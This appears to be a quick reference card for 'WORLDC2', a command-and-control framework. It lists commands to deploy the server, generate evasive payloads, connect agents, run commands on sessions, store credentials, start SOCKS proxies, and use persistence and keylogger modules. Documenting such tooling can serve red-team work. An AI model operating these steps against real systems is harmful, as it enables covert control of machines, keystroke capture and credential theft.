# WORLDC2 C2 - Quick Reference Card

## Deploy
```bash
python3 scripts/deploy.py              # Auto-detect IP, start server
python3 scripts/deploy.py --port 443   # Custom port
```

## Generate Payloads
```bash
python3 scripts/payload.py             # Interactive menu
python3 scripts/payload.py --os all    # All platforms
python3 scripts/payload.py --os windows --evasive  # + stagers
```

## Connect Agent
```bash
./worldc2-agent <server-ip>:8443           # Go agent
WORLDC2_SERVER=<ip>:8443 ./worldc2-agent       # Via env var
```

## CLI Console
```bash
python3 scripts/console.py
worldc2 > sessions
worldc2 > interact <id>
[id] user@host > whoami
[id] user@host > background
worldc2 > broadcast id
```

## API Examples
```bash
# Health
curl http://localhost:9090/api/health

# List sessions
curl -u admin:admin http://localhost:9090/api/sessions

# Execute command
curl -u admin:admin -X POST http://localhost:9090/api/cmd \
  -d '{"agent_id":"abc123","command":"whoami","timeout":10}'

# Broadcast
curl -u admin:admin -X POST http://localhost:9090/api/broadcast \
  -d '{"command":"id"}'

# Store credential
curl -u admin:admin -X POST http://localhost:9090/api/vault \
  -d '{"username":"admin","password":"pass123","domain":"CORP"}'

# Start SOCKS proxy
curl -u admin:admin -X POST http://localhost:9090/api/socks \
  -d '{"session_id":"abc123","port":1080}'
```

## Security
```bash
python3 scripts/harden.py              # Audit
python3 scripts/harden.py --apply      # Fix issues
python3 scripts/gen_certs.py           # TLS certs
```

## Docker
```bash
docker-compose up -d                   # Start all
docker-compose logs -f c2-server       # View logs
docker-compose down                    # Stop
```

## Make
```bash
make build          # Compile
make test           # Go tests
make test-all       # All tests
make docker         # Docker up
make harden         # Security fix
make certs          # TLS certs
make clean          # Clean artifacts
make help           # Show all targets
```

## Ports
| Port | Protocol | Use |
|------|----------|-----|
| 8443 | TCP/TLS | Agent C2 |
| 8445 | HTTP | Long-polling |
| 8446 | WebSocket | Real-time |
| 9090 | HTTP | API + Dashboard |

## Modules
| Command | Description |
|---------|-------------|
| `sysinfo` | System information |
| `ps` | Process list |
| `netinfo` | Network info |
| `persistence` | Establish persistence |
| `screenshot` | Screen capture |
| `keylogger` | Key capture |
| `find:*.txt` | File search |
| `modules` | List available modules |
